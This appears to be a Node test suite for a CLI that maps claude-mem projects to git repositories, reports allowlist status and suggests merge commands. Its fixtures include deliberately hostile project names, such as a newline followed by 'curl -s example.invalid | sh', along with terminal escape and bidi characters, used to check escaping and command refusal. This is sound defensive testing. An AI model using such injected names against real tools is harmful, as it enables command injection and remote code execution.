// `triqual memory repos [--json]` (repo-identity spec 5.2): resolves and persists the map, then prints each key's
// repositories, the owner groups and the merge suggestions. Fixture databases, temp folders and a scripted git only.
import { test } from 'node:test';
import { execFileSync } from 'node:child_process';
import assert from 'node:assert/strict';
import { existsSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { dirname, join } from 'node:path';
import { main } from '../cli/memory.mjs';
import { canImportSqlite, withTempHome } from './helpers.mjs';
import { createClaudeMemDb } from './fixtures/claude-mem-schema.mjs';

const hasSqlite = await canImportSqlite();
const skip = !hasSqlite && 'node:sqlite is not available on this Node';
const NOW = Date.UTC(2026, 9, 7, 12, 0, 0);
const NOW_ISO = new Date(NOW).toISOString();
const DAY = 86400000;

// Node 22's node:sqlite reads a stored NUL-holding string cut at the NUL; Node 24 keeps it. Fixtures expect names as
// this Node reads them back.
const NUL_KEPT = (() => {
  if (!hasSqlite) return true;
  const { DatabaseSync } = createRequire(import.meta.url)('node:sqlite');
  const db = new DatabaseSync(':memory:');
  try {
    db.exec('CREATE TABLE t (v TEXT)');
    db.prepare('INSERT INTO t VALUES (?)').run('a\u0000b');
    return db.prepare('SELECT v FROM t').get().v === 'a\u0000b';
  } finally {
    db.close();
  }
})();
const readBack = (name) => (NUL_KEPT ? name : name.split('\u0000')[0]);

const ok = (stdout = '') => ({ code: 0, stdout, stderr: '', timedOut: false });
const fail = (stderr, code = 1) => ({ code, stdout: '', stderr, timedOut: false });
// script[cwd] = { remotes } (a git root) or { nogit: true }; any other folder is missing.
function scriptedRun(script) {
  return async (cmd, args) => {
    const cwd = cmd === 'stat' ? args[0] : args[1];
    const b = script[cwd];
    if (b === undefined) return fail(`stat: cannot stat '${cwd}': No such file or directory`);
    if (cmd === 'stat') return ok('stat output');
    const rest = args.slice(2).join(' ');
    if (rest === 'rev-parse --show-toplevel') {
      return b.nogit ? fail('fatal: not a git repository (or any of the parent directories): .git', 128) : ok(`${realpathSync(cwd)}\n`);
    }
    const remotes = b.remotes ?? {};
    if (rest === 'remote get-url origin') return Object.hasOwn(remotes, 'origin') ? ok(`${remotes.origin}\n`) : fail("error: No such remote 'origin'", 2);
    if (rest === 'remote -v') return ok(Object.entries(remotes).flatMap(([n, u]) => [`${n}\t${u} (fetch)\n`, `${n}\t${u} (push)\n`]).join(''));
    return fail('unexpected command');
  };
}

async function run(env, argv, deps) {
  let out = '';
  let err = '';
  const code = await main(argv, { env, stdout: { write: (s) => { out += s; } }, stderr: { write: (s) => { err += s; } }, deps });
  return { code, out, err };
}

const obs = (id, project, session, over = {}) => ({
  id, memory_session_id: session, project, type: 'decision', title: `title ${id}`, narrative: `narrative ${id}`, facts: '[]',
  created_at_epoch: NOW - 3 * DAY + id * 1000, ...over,
});
const q = (s) => `'${s.replaceAll("'", "'\\''")}'`;

// `old` and `new` are two names of one repository; `plain` is a folder without git; `gone` a deleted folder. A temp
// claude-mem install and bun are found through CLAUDE_CONFIG_DIR and BUN.
async function withReposDb(fn, { extra = [] } = {}) {
  await withTempHome(async ({ env, paths, home }) => {
    const dir = (name) => {
      const d = join(home, 'code', name);
      mkdirSync(d, { recursive: true });
      return d;
    };
    const dirs = { old: dir('old'), new: dir('new'), plain: dir('plain'), gone: join(home, 'code', 'gone') };
    // `extra` names: more names of the same repository, each in its own folder, all older than `new`.
    extra.forEach((name, i) => { dirs[name] = dir(`extra${i}`); });
    mkdirSync(dirname(paths.dbFile), { recursive: true });
    createClaudeMemDb(paths.dbFile, {
      sessions: Object.entries(dirs).map(([name, cwd]) => ({ memory_session_id: `s-${name}`, project: name, cwd, started_at_epoch: NOW - DAY })),
      observations: [
        obs(1, 'old', 's-old'), obs(2, 'new', 's-new'), obs(3, 'new', 's-new'), obs(4, 'plain', 's-plain'), obs(5, 'gone', 's-gone'),
        ...extra.map((name, i) => obs(100 + i, name, `s-${name}`, { created_at_epoch: NOW - 10 * DAY })),
      ],
    });
    const configDir = join(home, 'claude-config');
    const install = join(home, 'install');
    mkdirSync(join(configDir, 'plugins'), { recursive: true });
    mkdirSync(join(install, 'scripts'), { recursive: true });
    writeFileSync(join(install, 'scripts', 'worker-service.cjs'), '');
    writeFileSync(join(configDir, 'plugins', 'installed_plugins.json'), JSON.stringify({ version: 2, plugins: { 'claude-mem@thedotmack': [{ scope: 'user', installPath: install }] } }));
    const bun = join(home, 'bun');
    writeFileSync(bun, '');
    const script = {
      [dirs.old]: { remotes: { origin: 'https://github.com/Acme/App.git' } },
      [dirs.new]: { remotes: { origin: 'https://github.com/acme/app' } },
      [dirs.plain]: { nogit: true },
      ...Object.fromEntries(extra.map((name) => [dirs[name], { remotes: { origin: 'https://github.com/acme/app' } }])),
    };
    const deps = { now: () => NOW, run: scriptedRun(script), sshHost: async (h) => h };
    await fn({ env: { ...env, CLAUDE_CONFIG_DIR: configDir, BUN: bun }, paths, home, dirs, deps, bun, worker: join(install, 'scripts', 'worker-service.cjs') });
  });
}

test('triqual memory repos prints the resolved count, each key, the owners and the merges, and persists the map', { skip }, () => withReposDb(async ({ env, paths, dirs, deps, bun, worker }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.err, '');
  assert.equal(r.code, 0);
  const backup = `sqlite3 ${q(paths.dbFile)} ${q(`.backup "${paths.stateDir}/claude-mem-backup-2026-10-07T12-00-00-000Z.db"`)}`;
  assert.equal(r.out, [
    'resolved: 4 of 4 keys (complete)',
    'gone — not allowed; not by repository: missing, nothing stored',
    `  ${dirs.gone} (missing)`,
    'new — not allowed; not by repository: github.com/acme/app is not in the allowlist',
    `  ${dirs.new} (root)`,
    `    github.com/acme/app (seen ${NOW_ISO})`,
    'old — not allowed; not by repository: github.com/acme/app is not in the allowlist',
    `  ${dirs.old} (root)`,
    `    github.com/acme/app (seen ${NOW_ISO})`,
    'plain — not allowed; not by repository: not a git repository',
    `  ${dirs.plain} (nogit)`,
    'owners:',
    '  github.com/acme/* — 2 projects — 3 notes',
    'merges:',
    "  github.com/acme/app: into 'new' from 'old'",
    `    ${backup}`,
    `    ${q(bun)} ${q(worker)} project merge 'old' 'new' --dry-run`,
    `    ${q(bun)} ${q(worker)} project merge 'old' 'new'`,
    '',
  ].join('\n'));
  const map = JSON.parse(readFileSync(join(paths.stateDir, 'repo-map.json'), 'utf8'));
  assert.deepEqual(map.folders[dirs.new].repos, [{ repo: 'github.com/acme/app', seenAt: NOW_ISO }]);
}));

test('triqual memory repos --json prints the same data as JSON', { skip }, () => withReposDb(async ({ env, dirs, deps }) => {
  const r = await run(env, ['repos', '--json'], deps);
  assert.equal(r.code, 0);
  const parsed = JSON.parse(r.out);
  assert.deepEqual(Object.keys(parsed), ['resolved', 'withCwd', 'complete', 'keys', 'owners', 'merges']);
  assert.deepEqual([parsed.resolved, parsed.withCwd, parsed.complete], [4, 4, true]);
  assert.deepEqual(parsed.keys.map((k) => k.project), ['gone', 'new', 'old', 'plain']);
  assert.deepEqual(parsed.keys[1], {
    project: 'new', repo: 'github.com/acme/app', reasons: [],
    folders: [{ cwd: dirs.new, status: 'root', repos: [{ repo: 'github.com/acme/app', seenAt: NOW_ISO }] }],
    status: 'not allowed', unlisted: ['github.com/acme/app'],
  });
  assert.deepEqual(parsed.keys[3].reasons, ['not a git repository']);
  assert.deepEqual(parsed.keys[3].unlisted, []);
  assert.deepEqual(parsed.owners, [{ owner: 'github.com/acme/*', projects: 2, notes: 3 }]);
  assert.deepEqual(parsed.merges.map((m) => [m.repo, m.into, m.from]), [['github.com/acme/app', 'new', ['old']]]);
}));

test('triqual memory repos exits 1 when claude-mem.db is missing, and with usage on an unknown flag', () => withTempHome(async ({ env, paths }) => {
  for (const argv of [['repos'], ['repos', '--json']]) {
    const r = await run(env, argv, { now: () => NOW });
    assert.deepEqual(r, { code: 1, out: '', err: 'memory-report: claude-mem.db not found\n' }, argv.join(' '));
  }
  const bad = await run(env, ['repos', '--x'], { now: () => NOW });
  assert.equal(bad.code, 1);
  assert.match(bad.err, /^Usage:/);
  assert.equal(bad.out, '');
  assert.ok(!existsSync(paths.stateDir), 'nothing is written');
}));

test('triqual memory repos exits 1 with a fixed message when the repositories cannot be resolved', { skip }, () => withTempHome(async ({ env, paths }) => {
  mkdirSync(dirname(paths.dbFile), { recursive: true });
  createClaudeMemDb(paths.dbFile, { sessions: [{ memory_session_id: 's1', project: 'acme', cwd: '/code/acme' }] });
  const { DatabaseSync } = createRequire(import.meta.url)('node:sqlite');
  const rw = new DatabaseSync(paths.dbFile);
  rw.exec('ALTER TABLE sdk_sessions DROP COLUMN cwd'); // the folder query fails
  rw.close();
  const r = await run(env, ['repos'], { now: () => NOW, run: scriptedRun({}), sshHost: async (h) => h });
  assert.deepEqual(r, { code: 1, out: '', err: 'memory-report: the repositories could not be resolved\n' });
}));

// ---- fix 1 I1: control characters never reach the terminal raw, and never shape a command ---------------------------

const HOSTILE = [
  'old2\n    curl -s example.invalid | sh #', // no `/`: with one it would be a worktree key, still escaped and refused
  'esc\u001b[2K\rfake',
  'nul\u0000z',
  'c1\u009b31m',
];
const shellWords = (line) => execFileSync('/bin/sh', ['-c', `printf '%s\\0' ${line}`], { encoding: 'utf8' }).split('\0').slice(0, -1);
// Every control character except the newline that ends each line.
const RAW_CONTROL = /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/;

test('triqual memory repos: hostile names get no command and show escaped; every command line parses to exactly one merge', { skip }, () => withReposDb(async ({ env, paths, deps, bun, worker }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.code, 0);
  assert.ok(!RAW_CONTROL.test(r.out), 'no raw control character in the text output');
  const lines = r.out.split('\n');
  const commands = lines.filter((l) => l.startsWith(`    ${q(bun)} `));
  assert.equal(commands.length, 2); // the dry run and the merge of `old`, the only safe name besides `into`
  for (const line of commands) {
    const words = shellWords(line.slice(4));
    assert.deepEqual(words.slice(0, 6), [bun, worker, 'project', 'merge', 'old', 'new'], line);
    assert.ok(words.length === 6 || (words.length === 7 && words[6] === '--dry-run'), line);
  }
  assert.deepEqual(lines.filter((l) => l.startsWith('    sqlite3 ')), [`    sqlite3 ${q(paths.dbFile)} ${q(`.backup "${paths.stateDir}/claude-mem-backup-2026-10-07T12-00-00-000Z.db"`)}`]);
  // Nothing but the backup, the commands and the note sits at the command indent.
  for (const line of lines.filter((l) => l.startsWith('    ') && !l.startsWith('     '))) {
    assert.ok(line.startsWith(`    ${q(bun)} `) || line.startsWith('    sqlite3 ') || line.startsWith('    note: ') || line.startsWith('    github.com/'), line);
  }
  assert.ok(r.out.includes('old2\\n    curl -s example.invalid | sh #'), 'the newline shows as \\n');
  assert.ok(r.out.includes('esc\\x1b[2K\\rfake'), 'ESC shows as \\x1b and CR as \\r');
  assert.ok(r.out.includes(NUL_KEPT ? 'nul\\x00z' : '\nnul — '), 'the NUL shows escaped, or the name as this Node reads it');
  assert.ok(r.out.includes('c1\\x9b31m'));
}, { extra: HOSTILE }));

test('triqual memory repos --json keeps the names exact (JSON escapes them) and gives the hostile names no command', { skip }, () => withReposDb(async ({ env, deps }) => {
  const parsed = JSON.parse((await run(env, ['repos', '--json'], deps)).out);
  const [m] = parsed.merges;
  assert.deepEqual(m.from, ['old', ...HOSTILE.map(readBack)].sort());
  assert.equal(m.commands.run.length, 1);
  assert.ok(parsed.keys.some((k) => k.project === HOSTILE[1]));
}, { extra: HOSTILE }));

// ---- final fix M3: line separators, bidi and invisible format characters, and backslashes --------------------------

const FORMAT_HOSTILE = ['ls\u2028x', 'rlo\u202ex', 'zw\u200bx', 'back\\slash'];

test('final fix M3: triqual memory repos gives a U+2028, U+202E or U+200B name no command and shows it escaped; a backslash shows as \\\\ but its command stays exact', { skip }, () => withReposDb(async ({ env, deps, bun, worker }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.code, 0);
  assert.ok(!/[\u2028\u2029\u061c\u200b-\u200f\u202a-\u202e\u2066-\u2069\ufeff]/.test(r.out), 'no raw format character in the text output');
  const commands = r.out.split('\n').filter((l) => l.startsWith(`    ${q(bun)} `));
  assert.deepEqual(commands.map((line) => shellWords(line.slice(4)).slice(0, 6)), [
    [bun, worker, 'project', 'merge', 'back\\slash', 'new'], [bun, worker, 'project', 'merge', 'old', 'new'],
    [bun, worker, 'project', 'merge', 'back\\slash', 'new'], [bun, worker, 'project', 'merge', 'old', 'new'],
  ], 'only back\\slash and old get a dry run and a merge, each naming the project exactly');
  for (const shown of ['ls\\u2028x', 'rlo\\u202ex', 'zw\\u200bx', "into 'new' from 'back\\\\slash'"]) assert.ok(r.out.includes(shown), shown);
}, { extra: FORMAT_HOSTILE }));

// ---- fix 1 M4: Ruling 12 applies to triqual memory repos ------------------------------------------------------------------

const IDENTITY_NOTE = 'Repository identity unavailable: no candidates are listed this run because never-send has repository or owner entries.';
// The key lines of the text output: not indented, and none of the counts, the identity note, owners or merges.
const keyLines = (out) => out.split('\n').filter((l) => l !== '' && !l.startsWith(' ') && l !== IDENTITY_NOTE && !/^(resolved|owners|merges):?/.test(l));

test('triqual memory repos on a rebuilt map with owner never-send entries prints the identity note and no merge command', { skip }, () => withReposDb(async ({ env, paths, deps, bun }) => {
  mkdirSync(dirname(paths.configFile), { recursive: true });
  writeFileSync(paths.configFile, JSON.stringify({ version: 1, neverSend: ['github.com/client/*'] }));
  mkdirSync(paths.stateDir, { recursive: true });
  writeFileSync(join(paths.stateDir, 'repo-map.json'), '{ not json');
  const text = await run(env, ['repos'], deps);
  assert.equal(text.code, 0);
  assert.ok(text.out.split('\n').includes(IDENTITY_NOTE), text.out);
  assert.ok(!text.out.includes(q(bun)), 'no command');
  assert.ok(!text.out.includes('sqlite3 '), 'no backup line');
  assert.ok(text.out.includes('(root)'), 'folder statuses still show');
  // Fix round 1 Minor 4: the status lines are still printed under Ruling 12.
  assert.deepEqual(keyLines(text.out), [
    'gone — not allowed; not by repository: missing, nothing stored',
    'new — not allowed; not by repository: github.com/acme/app is not in the allowlist',
    'old — not allowed; not by repository: github.com/acme/app is not in the allowlist',
    'plain — not allowed; not by repository: not a git repository',
  ]);
  const json = await run(env, ['repos', '--json'], deps);
  assert.equal(json.err, `memory-report: ${IDENTITY_NOTE.charAt(0).toLowerCase()}${IDENTITY_NOTE.slice(1)}\n`);
  const parsed = JSON.parse(json.out);
  assert.ok(parsed.merges.length > 0);
  for (const m of parsed.merges) assert.equal(m.commands, null);
}));

// ---- 0.3.1 fix 1: an effective status per key ------------------------------------------------------------------------

// One key per case: `vault` allowed by name, its only folder deleted with nothing stored; `fork` the fork shape (origin
// under the allowed owner, a second remote outside it) with no name rule; `named` the same shape with a name rule;
// `mine` covered by the owner entry; `hush` covered by the owner entry but never-sent by name.
// `extra` maps more keys to the origin of a folder of their own.
async function withStatusDb(fn, { config = { version: 1, allowlist: ['github.com/me/*', 'vault', 'named'], neverSend: ['hush'] }, corruptMap = false, extra = {} } = {}) {
  await withTempHome(async ({ env, paths, home }) => {
    const dir = (name) => {
      const d = join(home, 'work', name);
      mkdirSync(d, { recursive: true });
      return d;
    };
    const dirs = { vault: join(home, 'work', 'vault-stale'), fork: dir('fork'), named: dir('named'), mine: dir('mine'), hush: dir('hush') };
    for (const name of Object.keys(extra)) dirs[name] = dir(name);
    mkdirSync(dirname(paths.dbFile), { recursive: true });
    createClaudeMemDb(paths.dbFile, {
      sessions: Object.entries(dirs).map(([name, cwd]) => ({ memory_session_id: `s-${name}`, project: name, cwd, started_at_epoch: NOW - DAY })),
      observations: Object.keys(dirs).map((name, i) => obs(i + 1, name, `s-${name}`)),
    });
    mkdirSync(dirname(paths.configFile), { recursive: true });
    writeFileSync(paths.configFile, JSON.stringify(config));
    if (corruptMap) {
      mkdirSync(paths.stateDir, { recursive: true });
      writeFileSync(join(paths.stateDir, 'repo-map.json'), '{ not json'); // the map is rebuilt: the resolution is untrusted
    }
    const forkRemotes = { origin: 'https://github.com/me/fork.git', upstream: 'https://github.com/upstream/fork.git' };
    const script = {
      [dirs.fork]: { remotes: forkRemotes },
      [dirs.named]: { remotes: forkRemotes },
      [dirs.mine]: { remotes: { origin: 'https://github.com/me/mine.git' } },
      [dirs.hush]: { remotes: { origin: 'https://github.com/me/hush.git' } },
      ...Object.fromEntries(Object.entries(extra).map(([name, origin]) => [dirs[name], { remotes: { origin } }])),
    };
    await fn({ env, paths, dirs, deps: { now: () => NOW, run: scriptedRun(script), sshHost: async (h) => h } });
  });
}


test('0.3.1 fix 1: triqual memory repos gives each key its effective status and the reasons it is not allowed by repository', { skip }, () => withStatusDb(async ({ env, deps }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.err, '');
  assert.equal(r.code, 0);
  assert.deepEqual(keyLines(r.out), [
    'fork — not allowed; not by repository: github.com/upstream/fork is not in the allowlist',
    'hush — never sent',
    'mine — allowed by repository (github.com/me/*)',
    'named — allowed by name; not by repository: github.com/upstream/fork is not in the allowlist',
    'vault — allowed by name; not by repository: missing, nothing stored',
  ]);
}));

test('0.3.1 fix 1: triqual memory repos --json carries status and unlisted for each key, and keeps the existing fields', { skip }, () => withStatusDb(async ({ env, deps }) => {
  const r = await run(env, ['repos', '--json'], deps);
  assert.equal(r.code, 0);
  const parsed = JSON.parse(r.out);
  assert.deepEqual(Object.keys(parsed), ['resolved', 'withCwd', 'complete', 'keys', 'owners', 'merges']);
  const byKey = Object.fromEntries(parsed.keys.map((k) => [k.project, k]));
  assert.deepEqual(Object.fromEntries(parsed.keys.map((k) => [k.project, [k.status, k.unlisted, k.reasons]])), {
    fork: ['not allowed', ['github.com/upstream/fork'], []],
    hush: ['never sent', [], []],
    mine: ['allowed by repository', [], []],
    named: ['allowed by name', ['github.com/upstream/fork'], []],
    vault: ['allowed by name', [], ['missing, nothing stored']],
  });
  for (const k of parsed.keys) assert.deepEqual(Object.keys(k), ['project', 'repo', 'reasons', 'folders', 'status', 'unlisted'], k.project);
  assert.equal(byKey.mine.repo, 'github.com/me/mine');
}));

test('0.3.1 fix 1: allowed by repository names no entry when two allowlist entries match', { skip }, () => withStatusDb(async ({ env, paths, deps }) => {
  writeFileSync(paths.configFile, JSON.stringify({ version: 1, allowlist: ['github.com/me/*', 'github.com/me/mine'] }));
  const r = await run(env, ['repos'], deps);
  assert.equal(r.code, 0);
  assert.ok(keyLines(r.out).includes('mine — allowed by repository'), r.out);
}));

// ---- 0.3.1 fix round 1 ----------------------------------------------------------------------------------------------

// Minor 2: on an untrusted resolution the status follows what the next report would send, by name only (insights use
// emptyRepos()); the folders, reasons and unlisted repositories still come from the real resolution.
test('fix round 1 Minor 2: on a rebuilt map with no repository never-send entries, a key allowed only by repository shows not allowed', { skip }, () => withStatusDb(async ({ env, deps }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.code, 0);
  assert.ok(!r.out.includes(IDENTITY_NOTE), 'no identity note: never-send has no repository entries');
  assert.deepEqual(keyLines(r.out), [
    'fork — not allowed; not by repository: github.com/upstream/fork is not in the allowlist',
    'hush — never sent',
    'mine — not allowed',
    'named — allowed by name; not by repository: github.com/upstream/fork is not in the allowlist',
    'vault — allowed by name; not by repository: missing, nothing stored',
  ]);
  const parsed = JSON.parse((await run(env, ['repos', '--json'], deps)).out);
  assert.deepEqual(parsed.keys.map((k) => [k.project, k.status]), [
    ['fork', 'not allowed'], ['hush', 'never sent'], ['mine', 'not allowed'], ['named', 'allowed by name'], ['vault', 'allowed by name'],
  ]);
}, { corruptMap: true }));

test('fix round 1 Minor 2 and 4: on a rebuilt map with an owner never-send entry, the identity note and the status lines are both printed', { skip }, () => withStatusDb(async ({ env, deps }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.code, 0);
  assert.ok(r.out.split('\n').includes(IDENTITY_NOTE), r.out);
  assert.deepEqual(keyLines(r.out), [
    'fork — not allowed; not by repository: github.com/upstream/fork is not in the allowlist',
    'hush — never sent',
    'mine — not allowed',
    'named — allowed by name; not by repository: github.com/upstream/fork is not in the allowlist',
    'vault — allowed by name; not by repository: missing, nothing stored',
  ]);
}, { corruptMap: true, config: { version: 1, allowlist: ['github.com/me/*', 'vault', 'named'], neverSend: ['hush', 'github.com/client/*'] } }));

// Minor 3: the status covers the same keys as the listed folders, the base's worktree keys (`base/…`) included.
async function withWorktreeDb(fn) {
  await withTempHome(async ({ env, paths, home }) => {
    const dir = (name) => {
      const d = join(home, 'work', name);
      mkdirSync(d, { recursive: true });
      return d;
    };
    // `mine` and `ours` are covered by the owner entry; `mine/wt` sits in a client folder (never-send owner), `ours/wt`
    // in a folder of a repository that is on neither list; `solo/wt` is a clean worktree of a covered base.
    const keys = { mine: dir('mine'), 'mine/wt': dir('mine-wt'), ours: dir('ours'), 'ours/wt': dir('ours-wt'), solo: dir('solo'), 'solo/wt': dir('solo-wt') };
    mkdirSync(dirname(paths.dbFile), { recursive: true });
    createClaudeMemDb(paths.dbFile, {
      sessions: Object.entries(keys).map(([name, cwd], i) => ({ memory_session_id: `s-${i}`, project: name, cwd, started_at_epoch: NOW - DAY })),
      observations: Object.keys(keys).map((name, i) => obs(i + 1, name, `s-${i}`)),
    });
    mkdirSync(dirname(paths.configFile), { recursive: true });
    writeFileSync(paths.configFile, JSON.stringify({ version: 1, allowlist: ['github.com/me/*'], neverSend: ['github.com/client/*'] }));
    const script = {
      [keys.mine]: { remotes: { origin: 'https://github.com/me/mine.git' } },
      [keys['mine/wt']]: { remotes: { origin: 'https://github.com/client/mine.git' } },
      [keys.ours]: { remotes: { origin: 'https://github.com/me/ours.git' } },
      [keys['ours/wt']]: { remotes: { origin: 'https://github.com/other/ours.git' } },
      [keys.solo]: { remotes: { origin: 'https://github.com/me/solo.git' } },
      [keys['solo/wt']]: { remotes: { origin: 'https://github.com/me/solo.git' } },
    };
    await fn({ env, deps: { now: () => NOW, run: scriptedRun(script), sshHost: async (h) => h } });
  });
}

test('fix round 1 Minor 3: a base whose worktree folder is blocked is never sent, one whose worktree folder is not covered is not allowed', { skip }, () => withWorktreeDb(async ({ env, deps }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.code, 0);
  assert.deepEqual(keyLines(r.out), [
    'mine — never sent; not by repository: github.com/client/mine is not in the allowlist',
    'ours — not allowed; not by repository: github.com/other/ours is not in the allowlist',
    'solo — allowed by repository (github.com/me/*)',
  ]);
}));

// ---- 0.3.1 fix round 2: blocking uses the current evidence even when the resolution is untrusted ---------------------

test('fix round 2: on a rebuilt map, a key allowed by name whose folder is a never-sent owner\'s repository shows never sent', { skip }, () => withStatusDb(async ({ env, deps }) => {
  const r = await run(env, ['repos'], deps);
  assert.equal(r.code, 0);
  assert.ok(r.out.split('\n').includes(IDENTITY_NOTE), r.out);
  assert.ok(keyLines(r.out).includes('acmex — never sent; not by repository: github.com/client/x is not in the allowlist'), r.out);
  const parsed = JSON.parse((await run(env, ['repos', '--json'], deps)).out);
  assert.equal(parsed.keys.find((k) => k.project === 'acmex').status, 'never sent');
}, {
  corruptMap: true,
  config: { version: 1, allowlist: ['github.com/me/*', 'vault', 'named', 'acmex'], neverSend: ['hush', 'github.com/client/*'] },
  extra: { acmex: 'https://github.com/client/x.git' },
}));
